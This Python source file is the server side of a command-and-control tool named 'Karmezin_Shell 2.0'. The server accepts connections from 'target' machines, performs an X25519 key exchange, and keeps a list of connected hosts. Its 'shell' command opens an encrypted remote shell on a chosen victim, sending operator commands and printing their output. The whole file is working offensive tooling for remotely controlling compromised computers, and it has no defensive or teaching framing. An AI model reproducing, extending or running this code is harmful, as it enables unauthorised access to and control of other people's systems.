from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey, X25519PublicKey
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.exceptions import InvalidTag
import subprocess
import asyncio
import socket
import time
import sys
import os


async def establishing_connection(host:str, port:int):
    server = socket.socket(
        socket.AF_INET,
        socket.SOCK_STREAM,
    )
    server.setblocking(False)
    server.setsockopt(
        socket.SOL_SOCKET,
        socket.SO_REUSEADDR, 
        1
        )

    server.bind((host, port))
    server.listen()

    loop = asyncio.get_running_loop()
    while True:
        try:
            conn, addr = await loop.sock_accept(server)

        except asyncio.exceptions.CancelledError:
            raise

        except BaseException as erro:
            print(f"[-]Error was raised!:{erro}")
            raise

        else:
            yield conn, addr
    

async def handshake(conn:socket, addr:int, TIMEOUT=10):
    loop = asyncio.get_running_loop()
    start = time.monotonic()

    while time.monotonic() - start < TIMEOUT:
        client_confirmation_1 = ""
        buffer_client_confirmation_1 = len(b"KEY GEN")

        while len(client_confirmation_1) < buffer_client_confirmation_1:
            try:
                remaining = TIMEOUT - (time.monotonic() - start)
                chunk = await asyncio.wait_for(
                    loop.sock_recv(
                        conn, 
                        buffer_client_confirmation_1 - len(client_confirmation_1)
                        ),
                    timeout=remaining,
                )
                if not chunk:
                    conn.close()
                    return

                client_confirmation_1 += chunk.decode()

            except asyncio.TimeoutError:
                conn.close()
                return
        break

    if client_confirmation_1 != "KEY GEN":
        conn.close()
        return

    private_key = X25519PrivateKey.generate()
    await loop.sock_sendall(conn, b"KEY GEN")
    start = time.monotonic()

    while time.monotonic() - start < TIMEOUT:
            client_confirmation_2 = ""
            buffer_client_confirmation_2 = len(b"KEY SND")
    
            while len(client_confirmation_2) < buffer_client_confirmation_2:
                try:
                    remaining = TIMEOUT - (time.monotonic() - start)
                    chunk = await asyncio.wait_for(
                    loop.sock_recv(
                        conn, 
                        buffer_client_confirmation_2 - len(client_confirmation_2)
                        ),
                        timeout=remaining,
                    )
                    if not chunk:
                        conn.close()
                        return
                    
                    client_confirmation_2 += chunk.decode()

                except asyncio.TimeoutError:
                    conn.close()
                    return
            break


    if client_confirmation_2 != "KEY SND":
            conn.close()
            return

    while time.monotonic() - start < TIMEOUT:
        public_key_from_client_bytes = b""
        buffer_public_key_from_client = 32

        while len(public_key_from_client_bytes) < buffer_public_key_from_client:
            try:
                remaining = TIMEOUT - (time.monotonic() - start)
                chunk = await asyncio.wait_for(
                    loop.sock_recv(
                         conn,
                         32
                    ),
                    timeout=remaining,
                )
                public_key_from_client_bytes += chunk

            except asyncio.TimeoutError:
                conn.close()
                return
        break

        
    await loop.sock_sendall(conn, b"KEY RCV")
    public_key_from_client = X25519PublicKey.from_public_bytes(
        public_key_from_client_bytes,
    )
    public_key_from_server = private_key.public_key()
    public_key_from_server_bytes = public_key_from_server.public_bytes(
        encoding=serialization.Encoding.Raw,
        format=serialization.PublicFormat.Raw,
    )
    await loop.sock_sendall(conn, (b"KEY SND"))
    await loop.sock_sendall(conn, public_key_from_server_bytes)


    start = time.monotonic()
    while time.monotonic() - start < TIMEOUT:
            client_confirmation_3 = ""
            buffer_client_confirmation_3 = len(b"KEY RCV")
    
            while len(client_confirmation_3) < buffer_client_confirmation_3:
                try:
                    remaining = TIMEOUT - (time.monotonic() - start)
                    chunk = await asyncio.wait_for(
                        loop.sock_recv(
                            conn,
                            buffer_client_confirmation_3 - len(client_confirmation_3),
                        ),
                        timeout=remaining
                    )
                    client_confirmation_3 += chunk.decode()
                
                except asyncio.TimeoutError:
                    conn.close()
                    return
            break

    if client_confirmation_3 != "KEY RCV":
        conn.close()
        return
    

    shared_key = private_key.exchange(public_key_from_client)
    key_client = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=None,
        info=b"encryptation key"
    ).derive(shared_key)

    client = {"socket":conn, "client_ip":addr[0], "key":key_client}
    return client


async def handle_client(host:str, port:int, queue:asyncio.Queue[dict]): 
    try:
        tasks: list[asyncio.Task] = []
        async for conn, addr in establishing_connection(host, port):
            task = asyncio.create_task(
                handshake(conn, addr)
            )
            tasks.append(task)

            clients = []
            clients_ready = []
            while tasks:
                finished, pending = await asyncio.wait(
                    tasks,
                    return_when=asyncio.FIRST_COMPLETED
                )
                for task in finished:
                    if task.result() is None:
                        tasks.remove(task)
                    else:
                        clients.append(task.result())
                        tasks.remove(task)
                
            for client in clients:
                await queue.put({
                    client["client_ip"]:{
                        "socket":client["socket"],
                        "key":client["key"]
                        }
                    })
                clients_ready.append(client)
                clients = [client for client in clients_ready if client not in clients_ready]

    except asyncio.exceptions.CancelledError:
        raise

    except BaseException:
        raise


async def dict_editor(queue:asyncio.Queue[dict], machines_connected:dict):
    try:
        while True:
            client = await queue.get()
            machines_connected.update(client.copy())
            queue.task_done()

    except asyncio.exceptions.CancelledError:
        raise

    except BaseException as erro:
        raise


def encryptation(data:bytes, key_client:bytes):
    encryptor = ChaCha20Poly1305(key_client)
    nonce = os.urandom(12)
    AAD = b"Karmezin_Shell 2.0"
    data_encrypted = encryptor.encrypt(nonce, data, AAD)
    return data_encrypted, nonce


def unencryptation(data:bytes, key_client:bytes, nonce:bytes):
    decryptor = ChaCha20Poly1305(key_client)
    AAD = b"Karmezin_Shell 2.0"
    try:
        data_decrypted = decryptor.decrypt(nonce, data, AAD)
    except InvalidTag:
        return "[-]Invalid autentication!"
    return data_decrypted.decode()
 

async def listing_machines_connected(machines_connected:dict):
    print("[+]Machines connected!\n")
    while True:
        try:
            if len(machines_connected) == 1:
                for machine in machines_connected:
                    print(f"[+]{machine}")
                break

            if len(machines_connected) >= 2:
                for machine in machines_connected.keys():
                    print(f"[+]{machine}")
                break

        except asyncio.exceptions.CancelledError:
            raise


async def user_input(machines_connected:dict):
    while True:
        commands = ["shell", "list", "help", "clear"]
        try:
            data = await asyncio.to_thread(input, ":")
            if not any(data.startswith(command) for command in commands):
                print("[-]Unknow command")
                print("[-]Type again!")
                continue

            if data.strip().lower().startswith("shell"):
                try:
                    command, args = data.split(" ", 1)
                    address = args.strip("<>")

                except ValueError:
                    print("[-]Argument missing!")
                    print("[-]Type again!")
                    continue

                try:
                    for number in address.split("."):
                        try:
                            teste = int(number)
                        
                        except ValueError:
                            raise

                except ValueError:
                    print("[-]Invalid address!")
                    print("[-]Type again!")
                    continue

                sock = machines_connected[address]["socket"]
                key = machines_connected[address]["key"]
                status_shell, addr = await reverse_shell(sock, address, key)
                if status_shell == "[+]Shell finished!":
                    print("[+]Shell finished!")
                    continue
                
                elif status_shell == "[-]Connection closed by the target!":
                    print("[-]Connection closed by the target!")
                    sock = machines_connected[addr]["socket"]
                    sock.close()
                    del machines_connected[addr]

                elif status_shell == "[-]Not expected flag!":
                    print("[-]Not expected flag!")
                    sock = machines_connected[addr]["socket"]
                    sock.close()
                    del machines_connected[addr]

                elif status_shell == "[-]Timeout error!":
                    print("[-]Timeout error!")
                    sock = machines_connected[addr]["socket"]
                    sock.close()
                    del machines_connected[addr]

                elif status_shell == "[-]Connection closed by failed fidelity":
                    print("[-]Connection closed by failed fidelity")
                    sock = machines_connected[addr]["socket"]
                    sock.close()
                    del machines_connected[addr]

                elif status_shell.startswith("[-]Unknown error!"):
                    sock = machines_connected[addr]["socket"]
                    sock.close()
                    print(status_shell)


            elif (data.strip()).lower() == "list":
                if len(machines_connected) < 1:
                    print("[+]No machines connected!")
                else:
                    await listing_machines_connected(machines_connected)

            elif (data.strip()).lower() == "help":
                print("""\n\nC2 Server created by Matheus
                
Commands:
shell - establishing a reverse shell with the target (shell <IP target>)
list - list all machines actually connected with the server
help - show this text""")

            elif (data.strip()).lower() == "clear":#adaptar para SO
                subprocess.run("clear")
                print(r"""
 ____  __.                                  .__                .__           .__  .__   
|    |/ _|____ _______  _____   ____ _______|__| ____     _____|  |__   ____ |  | |  |  
|      < \__  \\_  __ \/     \_/ __ \\___   /  |/    \   /  ___/  |  \_/ __ \|  | |  |  
|    |  \ / __ \|  | \/  Y Y  \  ___/ /    /|  |   |  \  \___ \|   Y  \  ___/|  |_|  |__
|____|__ (____  /__|  |__|_|  /\___  >_____ \__|___|  / /____  >___|  /\___  >____/____/
        \/    \/            \/     \/      \/       \/       \/     \/     \/           2.0""")
                print("[+]Server started!")
                print("[+]Type 'help' for manual of how to use!")

        except asyncio.exceptions.CancelledError:
            raise
        
        except BaseException:
            raise


async def reverse_shell(conn:socket, addr:int, key_client:bytes, BUFFER=4096, TIMEOUT=10):
    try:
        request_shell_encrypted, nonce = encryptation(b"SHELL", key_client)
        loop = asyncio.get_running_loop()
        await loop.sock_sendall(conn, nonce + request_shell_encrypted)

        start = time.monotonic()
        while time.monotonic() - start < TIMEOUT:
            nonce = b""
            while len(nonce) < 12:
                try:
                    remaining = TIMEOUT - (time.monotonic() - start)
                    chunk = await asyncio.wait_for(
                        loop.sock_recv(
                            conn,
                            12 - len(nonce),
                        ),
                        timeout=remaining
                    )
                    if not chunk:
                        break
                    
                    nonce += chunk
            
                except asyncio.TimeoutError:
                    conn.close()
                    return "[-]Timeout error!", addr

                except asyncio.exceptions.CancelledError:
                    raise

                except BaseException as erro:
                    return f"[-]Unknown error!:{erro}", addr
                
                
            break

        if time.monotonic() - start >= TIMEOUT:
            conn.close()
            return "[-]Timeout error!", addr
    

        start = time.monotonic()
        while time.monotonic() - start < TIMEOUT:
            response_shell_encrypted = b""
            
            while len(response_shell_encrypted) < 25:
                try:
                    remaining = TIMEOUT - (time.monotonic() - start)
                    chunk = await asyncio.wait_for(
                        loop.sock_recv(
                            conn,
                            25 - len(response_shell_encrypted),
                        ),
                        timeout=remaining
                    )
                    response_shell_encrypted += chunk
                        
                except asyncio.TimeoutError:
                    conn.close()
                    return "[-]Timeout error!", addr
                    
            break

        request_shell = unencryptation(response_shell_encrypted, key_client, nonce)

        if request_shell ==  "[-]Invalid autentication!":
            print("[-]Invalid autentication!")
            print("[-]Closing connection with target!")
            conn.close()

        elif request_shell != "SHELL ACK":
            conn.close()
            return "[-]Not expected flag!", addr


        print("[+]Shell started!")
        while True:
            cmd = input(f"{addr}>>")
            if cmd == "quit":
                request_close, nonce = encryptation(b"SHELL CLS", key_client)
                await loop.sock_sendall(
                    conn,
                    nonce + request_close + b"EOF",
                )
                return "[+]Shell finished!", None
            
            cmd_encrypted, nonce = encryptation(cmd.encode(), key_client)
            await loop.sock_sendall(conn, nonce)
            await loop.sock_sendall(conn, cmd_encrypted + b"EOF")
        

            nonce = b""
            start = time.monotonic()
            while len(nonce) < 12:
                try:
                    remaining = TIMEOUT - (time.monotonic() - start)
                    chunk = await asyncio.wait_for(
                        loop.sock_recv(
                            conn,
                            12 - len(nonce),
                        ),
                        timeout=remaining
                    )
                    if not chunk:
                        return "[-]Connection closed by the target!", addr
                    
                    nonce += chunk
            
                except asyncio.TimeoutError:
                    return "[-]Timeout error!", addr  

            
            start = time.monotonic()
            encrypt_output = b""
            while True:
                try:
                    remaining = TIMEOUT - (time.monotonic() - start)
                    chunk = await asyncio.wait_for(
                        loop.sock_recv(
                            conn,
                            BUFFER,
                        ),  
                        timeout=remaining
                    )
                    if not chunk:
                        return "[-]Connection closed by the target!", addr

                    elif remaining == 0:
                        break

                    elif b"EOF" in chunk:
                        encrypt_output += chunk
                        encrypt_output = encrypt_output.replace(b"EOF", b"")
                        break

                except asyncio.TimeoutError:
                    return "[-]Timeout error!", addr
                

            if TIMEOUT - (time.monotonic() - start) <= 0:
                return "[-]Timeout error!", addr

            data_decrypt = unencryptation(encrypt_output, key_client, nonce)

            if data_decrypt == "[-]Invalid autentication!":
                print("[-]Invalid autentication!")
                print("[-]Closing connection with target!")
                conn.close()
                return "[-]Connection closed by failed fidelity", addr

            elif data_decrypt == "DONE":
                print("[+]Done")
                continue

            
            print(data_decrypt)


    except BaseException:   
        raise


async def main(host:str, port:int):
    print(r"""
 ____  __.                                  .__                .__           .__  .__   
|    |/ _|____ _______  _____   ____ _______|__| ____     _____|  |__   ____ |  | |  |  
|      < \__  \\_  __ \/     \_/ __ \\___   /  |/    \   /  ___/  |  \_/ __ \|  | |  |  
|    |  \ / __ \|  | \/  Y Y  \  ___/ /    /|  |   |  \  \___ \|   Y  \  ___/|  |_|  |__
|____|__ (____  /__|  |__|_|  /\___  >_____ \__|___|  / /____  >___|  /\___  >____/____/
        \/    \/            \/     \/      \/       \/       \/     \/     \/           2.0""")
    print("[+]Server started!")
    print("[+]Type 'help' for manual of how to use!")

    try:
        machines_connected = {}
        queue = asyncio.Queue()

        tasks: list[asyncio.Task] = [
            asyncio.create_task(
                handle_client(
                    host, 
                    port, 
                    queue
                    )
            ),
            asyncio.create_task(
                user_input(
                    machines_connected
                    )
            ),
            asyncio.create_task(
                dict_editor(
                    queue, 
                    machines_connected
                    )
            ),
        ]

        for task in asyncio.as_completed(tasks):
            try:
                status_code = await task
            except asyncio.exceptions.CancelledError:
                raise

            except BaseException as erro:
                print(f"[+]Erro ocorrido:{erro}")
                return

    except asyncio.exceptions.CancelledError:
        print("[+]Exiting from the script!")
        for task in tasks:
            if not task.done():
                task.cancel()

        await asyncio.gather(
            *tasks,
            return_exceptions=True,
        )
        sys.exit()


asyncio.run(main("192.168.1.100", 4444))